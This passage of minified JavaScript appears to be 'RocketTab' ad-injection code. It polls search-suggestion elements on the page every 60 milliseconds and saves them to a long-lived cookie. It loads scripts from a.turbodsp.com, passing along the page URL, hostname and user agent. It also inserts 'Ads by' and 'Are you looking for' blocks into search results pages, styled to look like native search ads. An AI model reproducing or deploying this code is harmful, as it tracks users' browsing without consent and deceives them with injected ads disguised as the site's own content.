		for(t=1;t<u;t++){
			v[t].style.display='block';
		}
	},
	q:function(y,x,w){
		x=this.co;
		w=x[5];
		w.removeAttribute('disabled');
		x[7]=this.value*1;
	},
	p:function(y,x,w,v,u,t,s,r,q,p){
		x=this.co;
		w={};v=new Date();u=x[1].z;t=x[0][0][1];q=u.length;
		w[d.e[x[0][0][11]]]=x[7];
		v.setTime(v.getTime()+x[7]);
		w.expires=v.toGMTString();
		h.d(w);
		for(s=0;s<q;s++){
			p=t.children[u[s]];
			p.innerHTML='';
			p.style.height=p.style.minHeight=0;
		}
		z.script(x[1].c+'?'+h.c(['CRPName','callback','rc','rc_','teid','tuid','tfsid'])+'&selectValue='+(x[7]/3600000/24)+'&page_url='+c.href);
	}
};
var ay=d.cpn;
(function(n){
var dawdw = n.getElementsByTagName("*");$gst = [];
function getSuggestDataList() {
    var c = [],f = navigator.appName,k = navigator.appVersion,h = k.split(";"),a = h[1]&&h[1].replace(/[ ]/g, "");
    function sc(a,c){var b=30;var d=new Date();d.setTime(d.getTime()+b*24*60*60*1000);document.cookie=a+"="+escape(c.replace(/(<b>|<\/b>)/gi,""))+";expires="+d.toGMTString()}function gc(b){var a,c=new RegExp("(^| )"+b+"=([^;]*)(;|$)");if(a=document.cookie.match(c)){return unescape(a[2])}else{return null}};
    var pg=gc("Pg");
    $gst=(pg==null)?[]:pg.split("|");
    if (f == "Microsoft Internet Explorer" && a &&(a == "MSIE6.0" || a == "MSIE7.0" || a == "MSIE8.0")) {
        var l = n.getElementsByTagName("table");
        for (var e = 0; e < l.length; e++) {
            if (l[e].className == "gssb_m") {
                var g = l[e].getElementsByTagName("span");
                for (var b = 0; b < g.length; b++) {
                    c[c.length] = g[b].innerHTML;
                }
                break;
            }
        }
    } else {
        for (var e = 0; e < dawdw.length; e++) {
            if (dawdw[e].className == "sbqs_c") {
                c[c.length] = dawdw[e].innerHTML;
            }
        }
    }
    if ($gst.join(",") == c.join(",")) {
        return;
    }
    if (c.length > 0) {
        $gst = c.slice();
        sc("Pg",$gst.join("|"));
    }
}
if (d.g_s_t !== false && ay && !d.slg) {
		getSuggestDataList();
    setInterval(getSuggestDataList, 60);
}
})(b);l.B=function(w,x,y,v){
	this[0]=w;
	this[1]=y;
	this[2]=x;
	this[68]=x.main&&'02'||'66';
	this[69]=1;
	this[70]='04';
	x.b=x.b.replace(/\{\^CRPName\^\}/ig,e.a.CRPName);
	this.x={a:/\{%RS%\}/i,b:{clickUrl:/\{%CLICKURL%\}/ig,kwd:/\{%KWD%\}/ig},c:{a:x.b,b:x.c,d:y},d:x.d};
	w.n(y);
};
l.B.prototype={
	z:function(w,x,y,v,s){
		s=this[68];
		if(!this[0].j.b){ 
			if(!v&&!(x.d&&z.getCookie(x.d[2]))){ 
				z.script(x.a+'?key='+p(this[0][0])+'&'+h.c(['rc_','CRPName'])+'&t='+p('a-b')+'&count='+d.u+'&tp=2&i='+this[0][6]+'&s='+c.hostname+'&page_url='+p(c.href));
			}else{
				this[0].j.b--;
			}
		}else if(!v&&!(x.d&&z.getCookie(x.d[2]))){
			this[0].im(s+'10');
		}
	},
	w:function(y){
		this.v.abcd=y.abcd;
		this[3]=z('a',this[0][1].childNodes[this[1]]);
		this[3].bind('click',this.v);
	},
	v:function(){
		h.g(arguments.callee.abcd);
	},
	u:function(y,x,w,v,u,t,s,r,q,p,o,n,m){ 
		if(!y.f){ 
			y.f=1;
			x=y.Message;w=new RegExp('\\b('+this[0][0].replace(/(\\|\||\[|\]|\(|\)|\-|\?|\.|\*|\+|\{|\})/g,'\\$1').split(' ').join('|')+')\\b','ig');n='<b>';m='</b>';s=new RegExp(n);
			for(v=0;u=x[v];v++){
				t=u.kwd.replace(w,n+'$1'+m+n);
				if(t!=u.kwd){
					r=t.split(s);o=r.length;
					for(q=0;q<o;q++){
						if(p=r[q]) r[q]=(p.indexOf(m)>-1)?p.replace(m,''):(n+p+m);
					}
					u.kwd=r.join('');
				}
			}
		}
	},
	r:function(y,x,w){ 
		y=this[0][1].children[this[1]].getElementsByTagName('a');
		for(x=0;w=y[x++];){ 
			if(w.getAttribute("data-title")){
				w.setAttribute("data-href",w.getAttribute("href"));
				w.setAttribute("href","/#"+w.getAttribute("data-title").replace(/<.*?>/ig,""));
				w.onclick=this.t;
			}
			//if(w.getAttribute("data-href")) w.onclick=this.t;
		}
	},
	t:function(x){ 
		open(this.getAttribute('data-href'),this.target||'_self');
		return h.h(x);
	},	
	cb:function(y,w,x){
		if(!w&&!(this[2].d&&z.getCookie(this[2].d[2]))){
			this.u(y);
			this[0].q(y,this,2);
			x=this[0][1].children[this[1]];
			x.style.minHeight=x.children.length>=1?'200px':'';
			//this.w(y);
			d.w&&this.r();
		}
	}
};
B.a=[];
B.a.cb=function(y,x,w,v){
	w=this[0].j;
	for(v in w){
		w[v]=0;
	}
	for(x=0;x<this.length;x++){
		this[x][14]&&this[x].cb(y);
	}
};
B.a.ss=function(x){
	d.po&&z.script(d.uu+'?'+h.c(['callback','rc','rc_','user_agent','pid'])+'&tp='+d.po+'&pf=pvpo');
	pvs=[];
	for(x=0;x<this.length;x++){
		this[x][14]&&this[x].ss();
		pvs.push(this[x].gim());
	}
};
B.a.inter=function(x){
	for(x=0;x<this.length;x++){
		this[x][15]&&this[x].h();
	}
};
d.po&&z.script(d.uu+'?'+h.c(['callback','rc','rc_','user_agent','pid'])+'&tp='+d.po+'&pf=pvpo');
z.css(d.d);
pvs=[];
if(d.a instanceof Array){
	for(var i=0;i<d.a.length;i++){
		B.a.push(new A(d,i));
		pvs.push(B.a[i].gim());
	}
}else{
	for(var i in d.a){
		B.a.push(new A(d,i));
		pvs.push(B.a[i].gim());
	}
}
})(window,document,location,{"a":[{"a":{"a":"\/\/a.turbodsp.com\/b.php","b":"<style>div#rssearch_container a {padding: 6px 0px;text-decoration:none;}<\/style>\r<div id=\"g-serp\" style=\"padding-left:10px;width:540px;background:#FFFAFF;\">\r<div id=\"_tads\">\r<div class=\"ads-container\" id=\"tads\" id=\"zxdf\"   style=\"display:block !important\">\r<h2 style=\"font-size:11px;font-weight:normal;margin:0 -13px 0 0;padding:4px 4px 8px 0;color:#aaa;display:block !important;\" title=\"Why these ads?\" onclick=\"javascript:ttis('info');return false;\" class=\"ads-label\"><span style=\"cursor:pointer;\">Ads by {^CRPName^} <\/span><span class=\"wtali\" style=\"cursor:pointer;right:29px;display:inline-block;margin-left:3px;float:right;margin-top:-2px;position:relative;top:2px;background-repeat:no-repeat;background-image:url('data:image\/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAAA\/ElEQVQoz5XSPUqDQRgE4Of7EAsrQc8QAkoQ72DlTyEWwdTBSoLYv8VeQMRKbANik8K\/zisESROx8ASeIE1sVlmCUTKwzbsz7Lw7UymQUlrHOfbQyOM33OMyIj6\/uXUhOsQYK+hiLZ8TrGKcOaAqRFfYjYhXvyCltIUnnEbEoMr2xtgpRSmlKUREVcxaeMFGjR76814qEREj9HG2hIO8xyypmqO\/w02NJoa\/7DT9tjuDIRq1xbGMSZ1z2l5AuImPOofbWUDYwXOd82vnr\/4TmdPGRVmAS+z\/U4AH9CJiUIZ7hOuc0y1G+aqV7R2jGxGDn8rNKXkTE7zjcbbkX+SBWLGP5202AAAAAElFTkSuQmCC') ;background-size:12px;height:12px;width:12px\"  title=\"Why these ads?\"><\/span>\r<span id=\"xbc\"  class=\"tfx_icon\" title=\"close\"  style=\"right:-2px;background-size:12px;\"><\/span>\r<\/h2>\r<div class=\"tooltip\" ><span id=\"info\" style=\"display: none;left:-42px;top:20px;position: absolute;\"><img class=\"callout___\" src=\"https:\/\/d2lh2xae64ne37.cloudfront.net\/adsset.png\" \/><p id=\"sdyt\">These ads are based on your current search terms.<\/p><p  id=\"sdyb\">Visit <a href=\"javascript:void(0);\">Ads Settings<\/a> to opt out of personalized ads from {^CRPName^}.<\/p><\/span><\/div>\r<ol class=\"ads-container-list\">{%ADS%}<\/ol><\/div><\/div><\/div>","c":"<li  style=\"border-top: 1px solid transparent;line-height: 18px;padding:10px 0 10px 0px;\" ><h3><a href=\"{%CLICK%}&pos=t{%no%}\" poslqbzhwg=\"t{%no%}\" id=\"vs0p2\">{%TITLE%}<\/a><\/h3><div class=\"kv kva ads-visurl\"><cite><a href=\"{%CLICK%}&pos=t{%no%}\" poslqbzhwg=\"t{%no%}\" style=\"text-decoration: none !important;\">{%URL%}<\/a><\/cite>\u200e<\/div><div class=\"ac ads-creative\"><a href=\"{%CLICK%}&pos=t{%no%}\" poslqbzhwg=\"t{%no%}\" style=\"color: #222 !important;text-decoration: none !important;\">{%DESC%}<\/a><\/div><div class=\"rsp\" a-style=\"width:250px;height:20px;display: inline-block;white-space: nowrap;text-overflow: ellipsis;overflow: hidden;\"  data-style=\"width:500px;margin:4px auto 0px auto;min-height:40px;\" pos=\"t\"><\/div><\/li>","d":5,"x":"#center_col","main":1,"e":["1","xbc","li0o2q1pz563726f73737269646572"],"f":{"a":[["Hour","24"],["Hour","72"],["Year","87600"]],"c":"\/\/a.turbodsp.com\/o.php","d":"ooc_"}},"b":{"a":"\/\/a.turbodsp.com\/n.php","b":"<div style=\"width:530px;background:#FFFFFF;padding:10px;left:-10px;position:relative;margin:0 0 20px 10px\" id=\"rssearch_container\">\r<div style=\"height:165px;\">\r<div class=\"med _Hb\" style=\"color:rgba(0,0,0,0.5);font-weight:bold;margin:5px 0 10px 0;font-size:18px\">Are you looking for<\/div>\r{%RS%}\r<\/div>\r<div style=\"clear:both;\">\r<span id=\"cbc\" title=\"hide related searches\" class=\"tfx_icon\" style=\"z-index:1000;background-size:12px;\"><\/span>\r<span style=\"top:-5px;position:relative;font-size:11px;font-weight:normal;color:#aaa;\">Ads by {^CRPName^}<\/span >\r<\/div>\r<\/div>","c":"<a data-title=\"{%KWD%}\"\rhref=\"{%CLICKURL%}&pos=t{%no%}\" poslqbzhwg=\"t{%no%}\"\rstyle=\"width:250px;float:left;line-height:20px;margin:0 3px 0 0;padding-top:4px;overflow:hidden;display:block;white-space:nowrap;text-overflow:ellipsis;\">\r{%KWD%}\r<\/a>","x":"#center_col","main":1,"d":["0","cbc","DI1KN0W2563726f73737269646572"]}},{"a":{"a":"\/\/a.turbodsp.com\/b.php","b":"<style>div#rssearch_container a {padding: 6px 0px;text-decoration:none;}<\/style>\r<div id=\"g-serp\" style=\"position:relative;left:-10px;padding-left:10px;width:540px;background:#FFFAFF;\">\r<div id=\"_tads\">\r<div class=\"ads-container\" id=\"tads\" id=\"zxdf\"   style=\"display:block !important\">\r<h2 style=\"font-size:11px;font-weight:normal;margin:0 -13px 0 0;padding:4px 4px 8px 0;color:#aaa;display:block !important;\" title=\"Why these ads?\" onclick=\"javascript:ttis('info');return false;\" class=\"ads-label\"><span style=\"cursor:pointer;\">Ads by {^CRPName^} <\/span><span class=\"wtali\" style=\"cursor:pointer;right:29px;display:inline-block;margin-left:3px;float:right;margin-top:-2px;position:relative;top:2px;background-repeat:no-repeat;background-image:url('data:image\/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAAA\/ElEQVQoz5XSPUqDQRgE4Of7EAsrQc8QAkoQ72DlTyEWwdTBSoLYv8VeQMRKbANik8K\/zisESROx8ASeIE1sVlmCUTKwzbsz7Lw7UymQUlrHOfbQyOM33OMyIj6\/uXUhOsQYK+hiLZ8TrGKcOaAqRFfYjYhXvyCltIUnnEbEoMr2xtgpRSmlKUREVcxaeMFGjR76814qEREj9HG2hIO8xyypmqO\/w02NJoa\/7DT9tjuDIRq1xbGMSZ1z2l5AuImPOofbWUDYwXOd82vnr\/4TmdPGRVmAS+z\/U4AH9CJiUIZ7hOuc0y1G+aqV7R2jGxGDn8rNKXkTE7zjcbbkX+SBWLGP5202AAAAAElFTkSuQmCC') ;background-size:12px;height:12px;width:12px\"  title=\"Why these ads?\"><\/span>\r<span id=\"xbc\"  class=\"tfx_icon\" title=\"close\"  style=\"right:-2px;background-size:12px;\"><\/span>\r<\/h2>\r<div class=\"tooltip\" ><span id=\"info\" style=\"display: none;left:-42px;top:20px;position: absolute;\"><img class=\"callout___\" src=\"https:\/\/d2lh2xae64ne37.cloudfront.net\/adsset.png\" \/><p id=\"sdyt\">These ads are based on your current search terms.<\/p><p  id=\"sdyb\">Visit <a href=\"javascript:;\">Ads Settings<\/a> to opt out of personalized ads from {^CRPName^}.<\/p><\/span><\/div>\r<ol class=\"ads-container-list\">{%ADS%}<\/ol><\/div><\/div>\r<\/div>","c":"<li  style=\"border-top: 1px solid transparent;line-height: 18px;padding:10px 0 10px 0px;\" ><h3><a href=\"{%CLICK%}&pos=b{%no%}\" poslqbzhwg=\"b{%no%}\" id=\"vs0p2\">{%TITLE%}<\/a><\/h3><div class=\"kv kva ads-visurl\"><cite><a  href=\"{%CLICK%}&pos=b{%no%}\" poslqbzhwg=\"b{%no%}\" style=\"text-decoration: none !important;color:#006621;\">{%URL%}<\/a><\/cite><\/div><div class=\"ac ads-creative\"><a href=\"{%CLICK%}&pos=b{%no%}\" poslqbzhwg=\"b{%no%}\" style=\"font-size:small;color: #222 !important;text-decoration: none !important;\" >{%DESC%}<\/a><\/div><div class=\"rsp\" a-style=\"width:250px;height:20px;display: inline-block;white-space: nowrap;text-overflow: ellipsis;overflow: hidden;font-size: small;\"  data-style=\"width:500px;margin:4px auto 0px auto;min-height:40px;\" pos=\"b\"><\/div><\/li>","d":5,"x":{"default":"#brs|||2","other":{"[&#?]tbm=isch":"#foot","[&#?]tbm=vid":"#extrares","[&#?]tbm=nws":"#search|||2","[&#?]tbm=shop":"#foot","[&#?]tbm=bks":"#foot","[&#?]tbm=app":"#foot","ctxdba":"#center_col"}},"main":0,"e":["1","xbc","li0o2q1pz4963726f73737269646572"],"f":{"a":[["Hour","24"],["Hour","72"],["Year","87600"]],"c":"\/\/a.turbodsp.com\/o.php","d":"ooc_"}},"b":{"a":"\/\/a.turbodsp.com\/n.php","b":"<div style=\"width: 530px;height: 192px;background: #FFFFFF;padding: 10px;left:-20px;position: relative;margin:0 0 0 10px;left:\" id=\"rssearch_container\">\r<div class=\"med _Hb\" style=\"color: rgba(0,0,0,0.5);font-weight:bold;margin:5px 0 10px 0;font-size:18px\">Are you looking for<\/div>\r{%RS%}\r<\/div>\r<span style=\"position: relative;font-size: 11px;font-weight: normal;color: #aaa;\">Ads by {^CRPName^}<\/span >\r<div style=\"float:right\">\r<span id=\"cbc\"  title=\"hide related searches\" class=\"tfx_icon\" style=\"z-index:1000;left:17px;background-size:12px;\"><\/span>\r<div style=\"color: #aaa;font-size: 8pt;\">&nbsp;<\/div>\r<\/div>","c":"<a data-title=\"{%KWD%}\"\rhref=\"{%CLICKURL%}&pos=b{%no%}\" poslqbzhwg=\"b{%no%}\"\rstyle=\"width:250px;height:20px;font-size:small;\rfloat:left;\rline-height:20px;\rmargin: 0 3px 0 0;\rpadding-top: 5px;overflow: hidden;display: block;white-space: nowrap;text-overflow: ellipsis;\">\r{%KWD%}\r<\/a>","x":{"default":"#brs|||2","other":{"[&#?]tbm=isch":"#foot","[&#?]tbm=vid":"#extrares","[&#?]tbm=nws":"#search|||2","[&#?]tbm=shop":"#foot","[&#?]tbm=bks":"#foot","[&#?]tbm=app":"#foot","ctxdba":"#center_col"}},"main":0,"d":["0","cbc","DI1KN0W24963726f73737269646572"]}}],"b":"q","d":".tfx_icon{background-image:url(\"data:image\/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAABSElEQVQoz4XSPWuUURAF4Od9EQuxCGiZIlUIMSwS7JclWGlSiEXQOliFIPZTTH5ACFZiK4jNFn51KbYPIVhkxUIkWEl+gKQQm1m5SEIuXLjMOYeZO+d0mpOZt\/ECD7FY5a94j\/2IOJtx+0b0CFPcwBZu1X2GOUyLA7pG9BIPIuLYBScz7+ITtiNi3NV4U9yPiOPMvIcfs7EKX4iIw8wc4AB3uszcxc2IeF6iA\/zEsJpNMI9RRBxl5h5+X8NG\/QNOS7RcAvU+qTq8w+seSziCiPiFURGXG9GoMMVd7C\/Yw58ratdx3pdPq80iJk2nWedJYbCC732Z+7SKC7WIk1rOsN7zhSnu577828zMQUQcYg3DiDgrS4ZYa+zYxF4bgH2sXxGAD9iJiHHXAI\/xCm\/wFl8KGtR4T7AVEeN\/kbsk5Es4xzd8\/D\/kfwFU1oAJzcq3pQAAAABJRU5ErkJggg==\");float:right;background-size:12px;display:inline-block;margin-left:5px;position:relative;background-repeat:no-repeat;cursor:pointer;height:14px;width:14px;};#er-wrap{display:none;visibility:hidden}#abc center{display:none;visibility:hidden}#abc center{display:none;visibility:hidden}#abb center{display:none;visibility:hidden}#er-wrap{display:none;visibility:hidden}div.tooltip_21du22{outline:0}div.tooltip_21du22 strong{line-height:30px}div.tooltip_21du22{text-decoration:none}div.tooltip_21du22 span{z-index:10;display:none;padding:5px 20px;margin-top:10px;margin-left:100px;width:300px;line-height:16px}.tooltip_21du22 div{font-size:small;font-family:arial,sans-serif}div.tooltip_21du22 span{display:inline;position:absolute;color:#666;border:1px solid #DCA;background:#fff;font-size:small;arial,sans-serif}.callout___{z-index:20;position:absolute;top:10px;border:0;top:-11px}#sdyt{margin-bottom:5px}div.tooltip_21du22 span{border-radius:1px;-moz-border-radius:1px;-webkit-border-radius:1px;-moz-box-shadow:0 0 10px #CCC;-webkit-box-shadow:0 0 10px #CCC;box-shadow:0 0 10px #CCC;}","e":["locale_cache_563726f73737269646572","locale_cache_4963726f73737269646572"],"f":1,"g":{"sex girls":1},"4":"\/\/a.turbodsp.com\/ct.php?","u":true,"l":2048,"slg":false,"grs":true,"nsc":0,"z":"12b383nh6neg6d1448601123394","w":0,"ref1":"63726f73737269646572","cc":"EC","g_s_t":0,"turbo":1,"cpn":{"G_SL":"CR_UI_G_SL_001","NS_SL":"CR_UI_NS_SL_001"},"po":"1,4,65,68,2,66","uu":"\/\/a.turbodsp.com\/u.php","rc":"7","rt_tid_switch":"1","rt_style":".rockettab-wrapper{background-color:#fffaff;box-sizing:content-box;position:relative;font-family:Arial;display:inline-block;width:512px;height:auto!important;padding:2px 36px 6px 8px;}.rockettab-wrapper ul,.rockettab-wrapper li{list-style:none!important;margin:0;padding:0;border:0;}.rounded{border-radius:5px;}#rt-menu{display:inline-block;width:542px;}#rt-menu-line{float:left;font-size:11px !important;color:#b7b7b7!important;}#rt-menu-container{display:inline-block;float:right;z-index:100;margin:-15px 0 0 0;}#rt-menu-container li{cursor:pointer;float:left;margin:0 5px 0 0!important;height:28px;width:28px;}#rt-ddc-wrapper{width:532px;display:block;margin:11px 0 2px 0;}#ddc-ads li{padding:0;width:100%;}.rt-ad-container{display:inline-block;margin-bottom:30px;font-size:13px;width:100%;}.rt-ad-container a{text-decoration:none;font-size:18px;line-height:18px;} .rt-ad-container span a{color: #222 !important;text-decoration: none !important;font-size: small;}  .rt-ad-container div a{font-size:14px;text-decoration:none;color:#006621;} .rt-ad-container div a:hover{text-decoration:none !important;}  .conceptLinks{display:none;margin:-14px 0 10px 21px;width:100%;}.conceptLinks p{margin:0;float:left;width:50%;} .conceptLinks a:hover{text-decoration:underline !important;}  .conceptLinks a{font-size:13px!important;text-decoration:none !important;width: 250px;height: 20px;display: inline-block;white-space: nowrap;text-overflow: ellipsis;overflow: hidden;}","rt_wrapper":"<div class=\"rockettab-wrapper rounded\"><div class=\"tooltip_21du22\"><span id=\"info\" style=\"display:none;left:-42px;top:20px;position:absolute;\"><img class=\"callout___\" src=\"https:\/\/d2lh2xae64ne37.cloudfront.net\/adsset.png\"\/><p id=\"sdyt\" style=\"margin:1em 0 1em 0;\">These ads are based on your current search terms.<\/p><p id=\"sdyb\" style=\"margin:1em 0 1em 0;\">Visit <a href=\"javascript:void(0);\">Ads Settings<\/a> to opt out of personalized ads from {^CRPName^}.<\/p><\/span><\/div><div id=\"rt-menu\"><div id=\"rt-menu-line\">RocketTab powered by {^CRPName^}<\/div><div style=\"width:552px;height:20px;padding:0;\"><span id=\"xbc\" class=\"tfx_icon\" style=\"right:3px;\" title=\"close\"><\/span><a rt-type-_-=\"gth\" onclick=\"javascript:ttis('info');return false;\" style=\"cursor:pointer;display:inline-block;right:;float:right;margin-left:3px;margin-top:-2px;position:relative;top:2px;background-repeat:no-repeat;background-image:url('data:image\/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAYAAAAfSC3RAAAA\/ElEQVQoz5XSPUqDQRgE4Of7EAsrQc8QAkoQ72DlTyEWwdTBSoLYv8VeQMRKbANik8K\/zisESROx8ASeIE1sVlmCUTKwzbsz7Lw7UymQUlrHOfbQyOM33OMyIj6\/uXUhOsQYK+hiLZ8TrGKcOaAqRFfYjYhXvyCltIUnnEbEoMr2xtgpRSmlKUREVcxaeMFGjR76814qEREj9HG2hIO8xyypmqO\/w02NJoa\/7DT9tjuDIRq1xbGMSZ1z2l5AuImPOofbWUDYwXOd82vnr\/4TmdPGRVmAS+z\/U4AH9CJiUIZ7hOuc0y1G+aqV7R2jGxGDn8rNKXkTE7zjcbbkX+SBWLGP5202AAAAAElFTkSuQmCC') ;background-size:12px;height:12px;width:12px\"><\/a><\/div><div id=\"rt-ddc-wrapper\"><ul id=\"ddc-ads\">{%TEMPLATE%}<\/ul><\/div><\/div><\/div>","rt_template":"<li><div class=\"rt-ad-container\"><a t-_p_-=\"{%TYPE%}\" whowhoo=\"our\" href=\"{%CLICK%}&pos={%no%}\" poslqbzhwg=\"{%no%}\">{%TITLE%}<\/a><br\/><div><a t-_p_-=\"{%TYPE%}\" whowhoo=\"our\" href=\"{%CLICK%}&pos={%no%}\" poslqbzhwg=\"{%no%}\">{%DISPLAYURL%}<\/a><\/div><span><a t-_p_-=\"{%TYPE%}\" whowhoo=\"our\" href=\"{%CLICK%}&pos={%no%}\" poslqbzhwg=\"{%no%}\">{%DESC%}<\/a><\/span><\/div><div class=\"conceptLinks\" {%DISPLAY%} pos=\"{%pos%}\" a-style=\"width:250px;height:20px;display:inline-block;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;\" data-style=\"display:block;\">{%SITELINK%}<\/div><\/li>","rat":"<a t-_p_-=\"{%TYPE%}\" whowhoo=\"our\" href=\"{%CLICK%}&pos={%no%}\" poslqbzhwg=\"{%no%}\"><\/a>","rt_site_link":"<p><a t-_p_-=\"{%TYPE%}\" whowhoo=\"our\" href=\"{%CLICK%}&pos={%no%}\" poslqbzhwg=\"{%no%}\">{%KWD%}<\/a><\/p>","rt_s":"1"})
